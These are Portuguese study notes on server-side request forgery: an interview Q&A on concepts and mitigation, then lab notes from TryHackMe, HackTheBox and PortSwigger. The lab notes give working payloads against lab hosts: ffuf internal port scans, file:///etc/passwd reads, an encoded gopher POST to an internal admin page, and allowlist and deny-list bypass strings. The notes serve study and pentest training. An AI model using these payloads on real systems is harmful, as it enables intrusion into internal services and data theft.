        **A:** Porque microservices e backends internos quase sempre vivem em redes privadas e podem expor APIs administrativas ou dados.
        
        **Q53. Quando port discovery faz sentido?**
        
        **A:** Quando você já provou acesso interno e quer identificar serviços relevantes. Se você ainda nem confirmou alcance, varrer portas vira ruído.
        
        **Q54. Qual objetivo do mapeamento interno via SSRF?**
        
        **A:** Encontrar serviços/endpoints que aumentem o impacto: admin, auth, config, secrets, metadata, ou APIs internas.
        
        **Q55. Rotas internas (HTTP) vs serviços (Redis/DB): o que priorizar?**
        
        **A:** Para entrevista/pentest, rotas HTTP internas costumam ser mais fáceis de demonstrar impacto; serviços exigem encadeamento e contexto.
        
        **Q56. Como “diferença de erro/tempo” sugere porta aberta/fechada?**
        
        **A:** Alguns cenários falham rápido (conexão recusada) e outros demoram (timeout). Em Blind SSRF isso vira pista, mas não prova absoluta.
        
        **Q57. Como reduzir falsos positivos ao usar timing?**
        
        **A:** Repetir testes, comparar com um baseline e buscar consistência. Timing sozinho pode variar por carga, cache, filas e rate limit.
        
        **Q58. Quando considerar “service interaction”?**
        
        **A:** Quando você identificou um serviço interno e existe hipótese plausível de extrair dados/credenciais ou provocar ação (não é “por tentar”, é por contexto).
        
        **Q59. Como priorizar alvos internos?**
        
        **A:** Admin/status, metadata cloud, serviços de identidade/config, e microservices com dados sensíveis — priorizando o que é mais provável de gerar impacto.
        
        **Q60. Como SSRF pode causar DoS acidental?**
        
        **A:** Forçando o servidor a baixar arquivos enormes, seguir loops de redirect, bater em endpoints lentos repetidamente ou varrer rede interna.
        
        **Q61. O que é SSRF chaining?**
        
        **A:** É usar SSRF como “ponte” para alcançar outro componente vulnerável/privilegiado e aumentar o impacto (ex.: SSRF → internal admin → ação crítica).
        
        **Q62. Como SSRF ajuda a descobrir outras falhas?**
        
        **A:** Pode revelar endpoints internos, serviços e comportamentos que abrem portas para IDOR, auth fraca, misconfig e outras vulnerabilidades.
        
        ### Schemes (ramificações)
        
        **Q63. Quando faz sentido testar file://?**
        
        **A:** Quando existe chance real do fetcher aceitar esquemas e o objetivo é ler arquivos locais; é mais uma ramificação do que um passo “padrão”.
        
        **Q64. O que precisa ser verdade para file:// funcionar?**
        
        **A:** A biblioteca precisa suportar esse scheme e não bloquear acesso ao filesystem; em stacks modernas isso costuma ser limitado.
        
        **Q65. Por que file:// falha mesmo existindo SSRF?**
        
        **A:** Porque o fetcher pode aceitar apenas HTTP/HTTPS, pode sanitizar schemes, ou rodar em ambiente sem acesso ao filesystem desejado.
        
        **Q66. Por que gopher:// aparece em SSRF?**
        
        **A:** Porque, quando suportado, pode permitir interagir com serviços internos em baixo nível. Em entrevista, basta explicar como “ponte para serviços internos”, sem detalhar payload.
        
        **Q67. O que é protocol smuggling (conceito)?**
        
        **A:** É explorar discrepâncias entre validação e execução para atingir comportamento/protocolo não pretendido, geralmente por parsing/normalização.
        
        **Q68. Por que não exagerar citando muitos schemes?**
        
        **A:** Porque pode soar como “lista de payloads”. Melhor citar como possibilidades e focar no raciocínio, alcance e mitigação.
        
        ---
        
        ## Nível 6 — Open Redirect + SSRF (chaining para bypass)
        
        **Q69. O que é Open Redirect e por que sozinho costuma ser baixo risco?**
        
        **A:** É um endpoint que redireciona para uma URL controlável. Sozinho, muitas vezes “só” facilita phishing; o risco sobe quando vira peça de encadeamento.
        
        **Q70. Por que Open Redirect fica sério com SSRF?**
        
        **A:** Porque permite uma URL inicial “permitida” (domínio allowlist) redirecionar o backend para um destino proibido (interno), burlando validações superficiais.
        
        **Q71. Qual o erro típico do dev nesse cenário?**
        
        **A:** Validar apenas o começo da URL (ou domínio inicial) e confiar que o destino final também será seguro — ignorando redirects e resolução real.
        
        **Q72. Validar URL inicial vs validar destino final: qual diferença?**
        
        **A:** A inicial é só a “porta de entrada”. O seguro é validar o destino final após redirects e a resolução DNS/IP (o que realmente será acessado).
        
        **Q73. Se o servidor não segue redirects, isso ainda funciona?**
        
        **A:** Fica bem mais difícil; o chaining depende do backend seguir 30x. Sem isso, o redirect não “leva” o SSRF ao alvo final.
        
        **Q74. Explicar Open Redirect + SSRF em 60s?**
        
        **A:** “Eu forneço uma URL do domínio permitido, mas esse endpoint redireciona para o alvo interno. Como o backend segue redirects, ele termina acessando o que era proibido.”
        
        **Q75. Mitigação específica contra esse chaining?**
        
        **A:** Não seguir redirects automaticamente ou revalidar o destino a cada redirect (host/IP), além de egress filtering para limitar o alcance.
        
        **Q76. Reportar como 1 achado ou 2?**
        
        **A:** Depende do contexto: se o open redirect é explorável sozinho, vale separá-lo; se ele é essencial para bypass do SSRF, pode ser reportado como cadeia com impacto combinado.
        
        ## Nível 7 — Bypass de filtros e “por que falham”
        
        **Q77. Blacklist vs allowlist: qual diferença real?**
        
        **A:** Blacklist tenta bloquear alguns destinos perigosos; allowlist só permite destinos aprovados. Allowlist costuma ser melhor, mas precisa ser implementada corretamente.
        
        **Q78. Por que blacklist por string é fraca?**
        
        **A:** Porque existem múltiplas representações para o mesmo host/IP e diferenças de parsing/normalização podem escapar da comparação literal.
        
        **Q79. Por que allowlist baseada em startsWith é fraca?**
        
        **A:** Porque a URL pode “parecer” começar com algo permitido, mas na execução resolver/encaminhar para outro host (subdomínios, redirects, parsing).
        
        **Q80. O que é parser confusion?**
        
        **A:** Quando um componente interpreta a URL de um jeito (validador) e outro interpreta diferente (cliente HTTP/proxy). Essa inconsistência cria bypass.
        
        **Q81. O que é URL normalization e por que importa?**
        
        **A:** É quando o sistema decodifica/ajusta a URL (case, percent-encoding etc.). Se validar antes e normalizar depois, você valida uma coisa e executa outra.
        
        **Q82. Por que validar hostname sem resolver DNS é perigoso?**
        
        **A:** Porque o domínio pode apontar para IP interno ou mudar com o tempo. Segurança real depende do IP final e das políticas de rede.
        
        **Q83. Como redirects quebram uma allowlist “bem-intencionada”?**
        
        **A:** Você começa em um domínio permitido, mas o 30x te leva para fora. Se a app não revalidar após redirect, a allowlist perde o sentido.
        
        **Q84. Subdomínios: onde o dev costuma errar?**
        
        **A:** Aceitar qualquer coisa que “contém” o domínio ou não diferenciar domínio raiz vs subdomínio controlável, permitindo confusões e bypass.
        
        **Q85. O que significa “dupla validação” e por que ajuda?**
        
        **A:** Validar antes do request e validar novamente após resolver DNS/seguir redirects. Isso reduz ataques que dependem de mudança entre etapas.
        
        **Q86. Bypass com @ e # (conceito, sem payload): como explicar?**
        
        **A:** Alguns caracteres mudam como a URL é interpretada (credenciais, fragmentos). Se a validação faz “string match” no lugar errado, ela pode acreditar que o host é um, mas o request ir para outro.
        
        **Q87. Por que double URL encoding aparece?**
        
        **A:** Porque camadas diferentes podem decodificar em momentos diferentes. Se uma validação decodifica uma vez e a execução decodifica de novo, abre discrepância.
        
        **Q88. Sinais de que a app decodifica duas vezes?**
        
        **A:** Mudanças de comportamento entre encode simples e duplo, e logs/erros que revelam a URL “final” diferente da validada inicialmente.
        
        **Q89. DNS rebinding: como isso se encaixa em bypass?**
        
        **A:** É quando um domínio muda a resolução (externo → interno) após validação. Se o sistema confia no hostname e não “fixa” o IP final, o destino real muda.
        
        ---
        
        ## Nível 8 — Cloud (como escalada)
        
        **Q90. Por que SSRF costuma ser muito mais grave em cloud?**
        
        **A:** Porque o backend pode acessar serviços internos de metadata e obter identidade/credenciais temporárias, permitindo ações além do app (recursos da conta).
        
        **Q91. O que é metadata service (conceito)?**
        
        **A:** Um serviço interno acessível pela instância que fornece informações do ambiente e, dependendo do provedor/config, pode fornecer credenciais/identidade.
        
        **Q92. Por que endereços link-local aparecem em cloud SSRF?**
        
        **A:** Porque são endereços acessíveis apenas “de dentro” da rede local da instância; SSRF é uma das formas típicas de alcançá-los.
        
        **Q93. Que tipo de dados críticos podem vazar via metadata?**
        
        **A:** Identidade da instância, tokens/credenciais temporárias e configurações — o suficiente para pivotar e acessar outros recursos.
        
        **Q94. Info leak vs credential exposure: qual diferença?**
        
        **A:** Info leak revela detalhes; credenciais permitem agir como aquela instância (e potencialmente escalar para recursos/serviços da conta).
        
        **Q95. O que é IMDSv2 e como mitiga SSRF?**
        
        **A:** É uma versão que exige um token de sessão obtido antes de consultar metadata, dificultando SSRF “direto”. Ajuda, mas não elimina SSRF como classe.
        
        **Q96. IMDSv2 elimina SSRF?**
        
        **A:** Não. Ele reduz um caminho de impacto (metadata simples), mas SSRF ainda pode atingir outros internos. E depende do ambiente estar corretamente configurado.
        
        **Q97. Além de metadata, o que amplia impacto em cloud?**
        
        **A:** Internal APIs, painéis internos, serviços de config/secrets, e integrações internas; o detalhe depende do provedor e arquitetura.
        
        **Q98. Como segmentação e egress control mudam o jogo?**
        
        **A:** Mesmo com SSRF, se o componente vulnerável não puder sair para destinos sensíveis (internos/metadata), o impacto cai muito.
        
        **Q99. Se não for cloud, como muda sua priorização?**
        
        **A:** Você foca em rede interna/on-prem: admin internos, serviços de auth/config, bancos/caches e APIs internas.
        
        ---
        
        ## Nível 9 — Impacto, severidade, “SSRF sem impacto”
        
        **Q100. Quais impactos tradicionais (fora de cloud)?**
        
        **A:** Acesso a endpoints internos/admin, mapeamento de rede/serviços, leitura de dados internos, e encadeamento com outras falhas.
        
        **Q101. Como SSRF leva a painel admin interno?**
        
        **A:** O backend consegue alcançar interfaces internas não expostas. SSRF vira uma “ponte” que faz o servidor requisitar a interface por você.
        
        **Q102. Blind SSRF pode vazar dados?**
        
        **A:** Pode, mas geralmente de forma indireta (exfil por DNS, timing, efeitos colaterais). A prova costuma ser mais difícil do que no Basic.
        
        **Q103. Por que mapear rede interna é relevante?**
        
        **A:** Porque revela superfície interna e pode permitir pivot e encadeamento — mesmo que você não obtenha dados no primeiro passo.
        
        **Q104. Por que microservices aumentam o risco?**
        
        **A:** Muitos serviços confiam na “rede interna” e expõem endpoints sem autenticação forte. SSRF quebra essa suposição de confiança.
        
        **Q105. SSRF pode causar DoS? Em que sentido?**
        
        **A:** Sim: induzindo o servidor a fazer requests caros, repetidos ou para endpoints lentos, consumindo recursos e degradando disponibilidade.
        
        **Q106. Quando SSRF pode ser low/informational?**
        
        **A:** Quando o fetcher tem egress bem restrito, não alcança internos/metadata e você não consegue demonstrar leitura/ação sensível — ainda assim merece correção.
        
        **Q107. SSRF sem impacto aparente é vulnerabilidade?**
        
        **A:** Em geral sim (controle indevido existe), mas a severidade pode ser baixa. Você separa “bug existe” de “impacto demonstrável”.
        
        **Q108. Como documentar alcance atual vs impacto potencial?**
        
        **A:** Eu descrevo o que provei (evidência) e, separado, hipóteses condicionais (“se houver cloud metadata acessível…”), sem exagero.
        
        **Q109. Se não consegui provar impacto, o que faço?**
        
        **A:** Reporto como baixa severidade com evidência técnica e recomendo mitigação (design/egress/validação). Isso mostra maturidade.
        
        **Q110. Como explicar severidade para gestão?**
        
        **A:** Traduzindo para risco: “o que um atacante conseguiria acessar” e consequências (dados, operação, credenciais, custo/indisponibilidade).
        
        **Q111. Onde CVSS entra aqui?**
        
        **A:** CVSS ajuda como padrão, mas SSRF é muito contextual: alcance de rede, cloud e controles (egress/segmentation) pesam muito no risco real.
        
        ---
        
        ## Nível 10 — Mitigação (ingênua → bypass → correta)
        
        **Q112. Mitigações ingênuas mais comuns?**
        
        **A:** Blacklist de `localhost`, regex simples, startsWith do domínio, e esquecer redirects. Elas “parecem” boas, mas quebram em casos reais.
        
        **Q113. Por que bloquear só localhost não resolve?**
        
        **A:** Porque alvos internos não são só localhost; há ranges privados, resoluções DNS e múltiplas representações que podem contornar bloqueios.
        
        **Q114. Por que regex/startsWith não resolve?**
        
        **A:** Porque validação por string não garante destino final: redirects, normalização e DNS podem mudar o alvo real.
        
        **Q115. O que é mitigação robusta na aplicação?**
        
        **A:** Evitar URL arbitrária; se precisar, allowlist forte + validação de IP final + controle de redirects + timeouts/limites + logs.
        
        **Q116. O que é mitigação robusta na rede?**
        
        **A:** Egress filtering e segmentação: o componente vulnerável só pode alcançar o mínimo necessário, reduzindo impacto mesmo se houver SSRF.
        
        **Q117. O que é egress filtering (explicação simples)?**
        
        **A:** É controlar para onde o servidor pode “sair”. Mesmo que o atacante tente apontar para internos/metadata, a rede bloqueia.
        
        **Q118. Por que “não aceitar URL do usuário” é a melhor mitigação?**
        
        **A:** Porque remove o vetor: o usuário não decide o destino. O sistema escolhe a partir de destinos controlados e auditáveis.
        
        **Q119. Allowlist por hostname vs por IP final?**
        
        **A:** Hostname pode resolver para IP interno ou mudar (rebind). Validar o IP final reduz esse risco e torna o controle mais real.
        
        **Q120. O que é revalidar após redirect?**
        
        **A:** É checar novamente o destino depois de cada 30x. Assim você impede que uma URL permitida leve o backend para fora da política.
        
        **Q121. E se a feature realmente precisa de URL livre?**
        
        **A:** Você isola o fetcher, restringe destinos, valida DNS/IP final, limita redirects, tamanho, métodos e tempo — e aplica egress control.
        
        **Q122. Rate limit e timeouts ajudam como?**
        
        **A:** Eles não “curam” SSRF, mas reduzem abuso e DoS e dificultam exploração em escala (varredura e requests caros).
        
        **Q123. Logs ajudam de que forma?**
        
        **A:** Permitem detectar padrões (muitos hosts/ports), rastrear abuso e ajustar controles. Também ajuda muito em incident response.
        
        **Q124. Defense-in-depth aplicado ao SSRF?**
        
        **A:** Camadas: validação + bloqueio de internos + controle de redirect + egress + segmentação + monitoramento/auditoria.
        
        **Q125. Serviço central vs periférico: muda algo?**
        
        **A:** Sim. Um fetcher central expõe um risco sistêmico e deve ter isolamento e controles mais fortes, porque o impacto escala com o uso.
        
        ---
        
        ## Nível 11 — Perguntas inspiradas nos seus slides (o que podem “cutucar”)
        
        **Q126. Por que “onde procurar SSRF” antes de exploração?**
        
        **A:** Porque mostra mentalidade de auditor: primeiro encontrar superfície, depois confirmar e só então explorar, evitando ruído e mostrando método.
        
        **Q127. Por que separar Basic e Blind em slides?**
        
        **A:** Porque muda a estratégia: Basic foca em resposta/reflexão; Blind exige OAST e inferência. Separar deixa didático.
        
        **Q128. Como escolher seus prints?**
        
        **A:** Para provar decisões: um print de confirmação Basic, um de Blind/OAST e um de filtro/bypass. Prints devem contar a história, não encher slide.
        
        **Q129. O que você deixou no apêndice por tempo?**
        
        **A:** Listas grandes (bypasses), detalhes de enumeração e schemes, e exemplos extras. Isso mostra que você priorizou clareza.
        
        **Q130. Qual lógica do pipeline que você propôs?**
        
        **A:** Vai do mais seguro/evidente (confirmar) para o mais impactante (escalada), com checkpoints (blind/filtros/cloud) para não “pular” etapas.
        
        **Q131. Por que cloud não é “tipo de SSRF”?**
        
        **A:** Cloud é contexto de impacto e superfície interna, não uma categoria do bug; o bug é SSRF, cloud é onde ele fica mais grave.
        
        **Q132. Qual bypass mais comum no mundo real?**
        
        **A:** Normalmente validações por string + redirects + DNS/normalização mal tratados. É menos “payload mágico” e mais “validação incompleta”.
        
        **Q133. Se tivesse mais 30 min, o que adicionaria?**
        
        **A:** Um caso completo de chaining (ex.: redirect + bypass) e um slide extra de mitigação por camadas e trade-offs de design.
        
        **Q134. O que foi mais difícil na pesquisa?**
        
        **A:** Geralmente parsing/normalização/DNS e entender onde a validação ocorre versus execução. Resolve comparando fontes e validando em labs.
        
        **Q135. Se discordarem da severidade, como defender?**
        
        **A:** Eu mostro alcance real do fetcher, controles existentes (egress/segmentation) e evidências. Severidade deve ser baseada em risco, não “achismo”.
        
        ---
        
        ## Nível 12 — Avançadas (para esticar seu limite)
        
        **Q136. Como inconsistência entre parsers gera bypass?**
        
        **A:** Se o validador extrai host de um jeito e a biblioteca HTTP envia de outro, você valida “A” e acessa “B”. Esse desalinhamento é raiz de muitos bypasses.
        
        **Q137. Como proxy/cache interno pode mudar a exploração?**
        
        **A:** Pode mascarar destino real, alterar headers, seguir redirects ou aplicar regras próprias. Isso muda evidência e pode causar falsos positivos se você não correlacionar.
        
        **Q138. O que é canonicalization e por que importa?**
        
        **A:** É transformar a URL para um formato “canônico” (decoding/normalização). Se isso ocorre depois da validação, o destino final pode mudar.
        
        **Q139. O que é second-order SSRF (conceito)?**
        
        **A:** É quando você injeta a URL agora, mas o request só acontece depois (job assíncrono/worker). Isso dificulta confirmar e correlacionar.
        
        **Q140. SSRF pode se combinar com XXE?**
        
        **A:** Sim: XXE pode induzir o parser a fazer requests internos/externos, resultando num efeito parecido com SSRF e ampliando alcance.
        
        **Q141. SSRF pode se combinar com request smuggling (conceito)?**
        
        **A:** Em arquiteturas com proxies, divergências de parsing podem alterar roteamento interno. É avançado, mas a ideia é: “interpretações diferentes → comportamento interno inesperado”.
        
        **Q142. Quais limitações do blind SSRF dificultam provar impacto?**
        
        **A:** Você não vê conteúdo, então depende de callbacks e sinais indiretos, que podem ser ambíguos. A prova tende a ser “comportamental”, não “conteúdo”.
        
        **Q143. Como reduzir falsos positivos por timing?**
        
        **A:** Repetição, baseline, consistência e múltiplos sinais. Timing isolado é frágil; o objetivo é montar um conjunto de evidências.
        
        **Q144. Quando recomendar mudança de arquitetura, não só validação?**
        
        **A:** Quando a feature exige URL arbitrária e a superfície de ataque é estrutural. Nesses casos, controles na borda podem não ser suficientes sem isolamento/egress.
        
        **Q145. Dois controles que mais reduzem impacto (prioridade)?**
        
        **A:** 1) **Egress filtering/segmentação** (limita alcance) e 2) **remover URL arbitrária ou allowlist robusta com validação do destino final** (reduz o vetor).
        
    
    ---
    
    - **SSRF** (TryHackMe)
        - **SSRF** (**S**erver-**S**ide **R**equest **F**orgery)  **⇒** vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.
        - Basicamente quando o site tem redirecionamentos ou HTTP requests e nós conseguimos interceptar e alterar a URL dele, e como nós alteramos uma URL que o site que estava renderizando, ele renderizará o que inserimos pois entenderá que veio do servidor e não da gente o Request, pois apenas alteramos.
        - Também sempre interceptar ações que mudam de link ou fazem alguma requisição na API (ex: checar estoque de produto), pode ser que tenha um HTTP request que possamos alterar ao interceptar.
        - Sempre olhar a URL por algo como:
            
            ![aa.png](./images/aa-7.png)
            
        - Caso a gnt consiga redirecionar para uma página de admin, talvez não tenhamos acesso para alterar nada nem fazer ações, pois o site entenderá que somos cliente. Então devemos inspecionar o que gostariamos de fazer e inserir no Request anterior em que temos acesso (de alterar o HTTP request).
        - `&x=` no final da URL inserida (caso seja na própria URL a vulnerabilidade), faz ignorar o resto.
        - caso a aplicação for php e tiver `?language=` na URL, podemos tentar inserir um HTTP, ex: 127.0.0.1. Conseguimos também no lugar da http inserir e ler arquivos:  `file://etc/passwd`
        - <u>**Bypass de filtros:**</u> Sempre testar`localhost` ou `127.0.0.1`, caso tenha filtro:
            - Testar `127.1`  ⇒ mesmo resultado para o sistema mas caso tenha um filtro específico pode ser que de certo.
            - Converter IP `127.0.0.1` para Decimal version (google)
            - Caso o `/admin` não funcione ⇒ encodar como URL, se não der certo encodar duas vezes.
        
        ---
        
        - **Types of SSRF:**
            - **regular SSRF** → data is returned to the attacker’s screen
            - **blind SSRF** →  SSRF occurs, but no information is returned to the attacker's screen
        - **Impacts:**
            - Access to unauthorised areas.
            - Access to customer/organisational data.
            - Ability to Scale to internal networks.
            - Reveal authentication tokens/credentials.
        - <u>**SSRF Defenses:**</u>
            - **Deny List**
                - Bloqueio de IPs ou domínios sensíveis, como o *localhost* (127.0.0.1).
                - **Riscos:**
                    - **Contorno de Deny List**: Atacantes podem usar variações de *localhost* (ex: 0.0.0.0, 127.1, 127.*.*.*, etc.).
                    - **Subdomínios maliciosos**: Atacantes podem registrar subdomínios que apontam para IPs restritos (ex: *127.0.0.1.nip.io*).
            - **Allow List:**
                - Apenas recursos explicitamente permitidos são acessíveis, bloqueando todo o resto.
                - **Ex**: Um parâmetro de URL deve começar com "*https://website.thm*" para ser aceito.
                - **Riscos:**
                    - **Contorno de Allow List**: Atacantes podem criar subdomínios maliciosos que se assemelham ao domínio permitido (ex: [*https://website.thm.attackers-domain.thm*](https://website.thm.attackers-domain.thm/)), e assim, passam pelo filtro de permissões.
        - **Open Redirect:**
            - Ocorre quando o servidor permite que os visitantes sejam redirecionados para URLs controladas por terceiros.
            - **Ex:** O endpoint [*https://website.thm/link?url=https://tryhackme.com*](https://website.thm/link?url=https://tryhackme.com)  redireciona automaticamente o visitante para o site *tryhackme.com*.
            - Riscos:
                - **Uso malicioso em SSRF**: Atacantes podem usar um redirecionamento aberto para passar pelas restrições de URL. Mesmo que o sistema só permita URLs que comecem com [*https://website.thm/*](https://website.thm/), o atacante pode redirecionar a requisição para outro domínio malicioso.
        
        ---
        
    - **SSRF** (HackTheBox)  !!
        - **Identifying**
            - **SYCP** → Inserimos um link (no caso do video, no nosso perfil podemos inserir o link de uma imagem para colocar de avatar). Para confirmarmos o SSRF, podemos procurar por interactsh no google, copiar o link/codigo dele e inserir na URL vulneravel do SSRF (e retornara algo no site interact, confirmando..)
            
            ---
            
            ![image.png](./images/image-1.png)
            
            Uma funcionalidade de checar disponibilidade de horario, ao interceptar com Burp:
            
            ![image.png](./images/image-2.png)
            
            Notamos que o site envia um Post para `availability.php` com a data e eh retornado se disponivel ou nao, ou seja, podemos comecar a tentar explorar tentando alterar essa URL.
            
            Para confirmar, podemos abrir um Listener no nosso terminal e inserir nosso IP e porta na URL:
            
            ![image.png](./images/image-3.png)
            
            Se recebermos algo no Listener, confirmamos SSRF.
            
            PARA ver se eh Basic SSRF ou Blind SSRF, tentamos conectar na aplicacao em si (ou seja, pag que sabemos q existe, como index.php), se retornar HTML (print 1) eh Basic, se retornar “erro” (print 2) eh Blind.
            
            ![image.png](./images/image-4.png)
            
            ![image.png](./images/image-5.png)
            
            ---
            
        
        ---
        
        - **Basic SSRF Exploiting**
            - **IP enumeration**
                
                Caso o parametro da URL vulneravel seja um IP, exemplo: `http://192.168.0.1:8080/admin`
                
                Podemos entao usar o Fuzzing do Burp no valor `1` para enumerar IPs
                
                ---
                
            - **Port enumeration**
                
                Uma exploracao possivel eh o scan de Portas da seguinte maneira (primeiro testamos em uma porta do localhost do alvo que sabemos que esta fechada e vemos se resulta em erro e anotamos as palavras da response para inserir no ffuf depois):
                
                Criamos um arquivo no nosso terminal com portas ate 10.000:
                
                **`seq 1 10000 > ports.txt`**
                
                PODEMOS USAR BURP INTRUDER EM VEZ O FFUF ABAIXO! (em um lab apenas o intruder funcionou)
                
                Com a requisicao e parametros, rodamos **ffuf** para checar porta por porta:
                **`ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"`**
                
            
            ---
            
            - **Directory e Subdomain Enumeration** (do servidor/URL/IP em que a requisicao estava sendo feita a priori)
                
                podemos antes de tudo testar alguns arquivos padrão e sensíveis (config, etc)
                
                Primeiro tentamos acessar pelo nosso Browser pra ver a response (apenas a url e porta, sem o php):
                
                ![image.png](./images/image-6.png)
                
                E tambem vemos o que acontece ao acessar uma pagina que SABEMOS que eh inexistente para ver o formato da resposta de erro:
                
                ![image.png](./images/image-7.png)
                
                Agora podemos usar ffuf para enumerar, retirando tambem os que retornam erro 403 com a string que vimos acima (Server at dateserver…):
                
                (PODEMOS VER DE TENTAR BURP INTRUDER!)
                
                e para subdominios podemos usar a wordlist **`dns-Jhaddix.txt`**!
                
                ```bash
                ffuf -w seclists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
                ```
                
            - **Local FIle Inclusion (LFI)**
                
                Usar a URL scheme **`file://`** para tentar ler arquivos:
                
                ```bash
                file:///etc/passwd
                ```
                
                ![image.png](./images/image-8.png)
                
                (para + detalhes de exploracao ver no modulo de LFI…)
                
                ---
                
            - **gopher Protocol**
                
                se tivermos identificado alguma porta como **SMTP** ou **MYSQL** (ver todas em `gopherus.py -h`), podemos de forma automatizada usar a ferramenta gopherus para explorar:
                
                **`python2.7 gopherus.py --exploit smtp`**
                
                Depois de preencher, temos o o payload pronto para enviar (nao sei como fazer proveito disso).
                
                ---
                
                Quando (como no caso do diretorio **`/admin`** encontrado) encontramos uma pagina que requer um prompt de login (ou seja, que exige POST) (o que nao eh possivel alterarmos manualmente pelo `http://` presente no SSRF, entao o gopher nos faz isso), podemos alternar a requisicao para POST.
                
                Antes:
                
                ![image.png](./images/image-9.png)
                
                Para mudarmos, precisamos encodar em URL os caracteres especiais, inserindo a requisicao abaixo DENTRO do parametro (dateserver):
                
                ```
                POST /admin.php HTTP/1.1
                Host: dateserver.htb
                Content-Length: 13
                Content-Type: application/x-www-form-urlencoded
                
                adminpw=admin
                ```
                
                spaces (`%20`) and newlines (`%0D%0A`) e caracteres especiais, resultado final:
                
                **`dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01`**
                
                ```bash
                POST /index.php HTTP/1.1
                Host: 172.17.0.2
                Content-Length: 265
                Content-Type: application/x-www-form-urlencoded
                
                dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
                ```
                
                FERRAMENTA: **`gopherus.py`**
                
                ---
                
        - **Bypass**
            
            [https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
            
            ---
            
            - <u>**Bypass de filtros:**</u> Sempre testar`localhost` ou `127.0.0.1`, caso tenha filtro:
                - Testar `127.1` e `0.0.0.0`  ⇒ mesmo resultado para o sistema mas caso tenha um filtro específico pode ser que de certo.
                - Converter IP `127.0.0.1` para Decimal version (google)
                - Caso o `/admin` não funcione ⇒ encodar como URL, se não der certo encodar duas vezes!!
            - <u>**Allow e Deny List E BYPASS ESPECIFICOS PRA CADA UM**</u>
                - **Deny List**
                    - Bloqueio de IPs ou domínios sensíveis, como o *localhost* (127.0.0.1).
                    - **Riscos:**
                        - **Contorno de Deny List**: Atacantes podem usar variações de *localhost* (ex: 0.0.0.0, 127.1, 127.*.*.*, etc.).
                        - **Subdomínios maliciosos**: Atacantes podem registrar subdomínios que apontam para IPs restritos (ex: *127.0.0.1.nip.io*).
                - **Allow List:**
                    - (olhar PS cheat-sheet)
                    - Apenas recursos explicitamente permitidos são acessíveis, bloqueando todo o resto.
                    - **Ex**: Um parâmetro de URL deve começar com "*https://website.thm*" para ser aceito.
                    - **Riscos:**
                        - Caso queiramos acessar **`localhost/admin`**, e a whitelist precisa ter o **`stock.weliketoshop.net`**, podemos iniciar com localhost e usar **`#@`** para anular a URL necessaria (e o diretorio **`/admin`** vai no fim normalmente, apenas fica anluada o que esta antes da **`/`** ), caso nao de, podemos encodar APENAS o **`#`**, se nao der encodamos novamente (2encodes somente no **`#`**), ex:
                        **`http://localhost:80%2523@stock.weliketoshop.net/admin`**
                            
                            OU colocar a URL allowed e depoois **`@`** e depois o localhost 
                            
                            **`stock.nahamstore.thm@localhost`**
                            
                            E com **`#`** no final:
                            
                            **`stock.nahamstore.thm@localhost#`**
                            
                        - **Contorno de Allow List**: Atacantes podem criar subdomínios maliciosos que se assemelham ao domínio permitido (ex: [*https://website.thm.attackers-domain.thm*](https://website.thm.attackers-domain.thm/)), e assim, passam pelo filtro de permissões.
                        - **OPEN REDIRECT** tambem eh um contorno??
        
        ---
        
        - **Blind SSRF**
            
            VER POSSÍVEL nomeado SEMI-BLIND SSRF (time-based)
            
            Podemos tentar fazer um port Scan, mas dependendo da aplicacao ela retorne algo como:
            
            ![image.png](./images/image-10.png)
            
            (porta claramente que nao existe responde com: Something went wront!)
            
            Porem ao checar uma porta que esta aberta (indo nas provaveis, no caso HTTP por ex..) notamos que a aplicacao retorna de maneira diferente:
            
            ![image.png](./images/image-11.png)
            
            Entao concluimos que ela responde dessa 2a maneira quando a porta esta aberta (pode ser que isso faca com que ele so conseguimos identificar as portas abertas que respondem com HTTP…ex: 3306 do mysql esta aberta mas tambem responde como fechada) 
            
            Podemos automatizar usando **ffuf**
            
            Primeiro criamos um arquivo no nosso terminal com portas ate 10.000 e depois rodamos com a mensagem do `-fr` de quando indica que a porta nao esta aberta:
            
            **`seq 1 10000 > ports.txt`**
            
            ```bash
            ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Something went wrong"
            ```
            
            Apesar de nao conseguirmos ler arquivos como no Basic, podemos checar a existencia deles (caso por algum motivo isso seja util p nos) identificando a diff de resposta de um caso verdadeiro e um falso:
            
            ![image.png](./images/image-12.png)
            
            ![image.png](./images/image-13.png)
            
        
        ---
        
        - **Prestar atencao para possivel escalonamento para DDOS**
        - AS vezes ele nao faz a animacao e atualiza a pagina para fazer uma requisicao POST para API, ficar esperto sempre na requisicao do Burp prioritariamente
    
    ---
    
    - **PortSwigger**
        - **Lab 1: Basic SSRF against the local server** (APPRENTICE)
            
            ```php
            This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
            ```
            
            Enumeramos e encontramos o diretorio **`/admin`**
            
            `http://localhost/admin`.
            
            Ao visitar vemos que aparece a opcao de deletar usuarios, porem ao clicar em deletar nao temos a validacao e somos proibidos de faze-lo, portanto vemos no inspect como funciona o envio dessa funcao de deletar e inserimos na requisicao (no caso URL) e rodamos dnv do SSRF:
            
            `http://localhost/admin/delete?username=carlos`
            
            ---
            
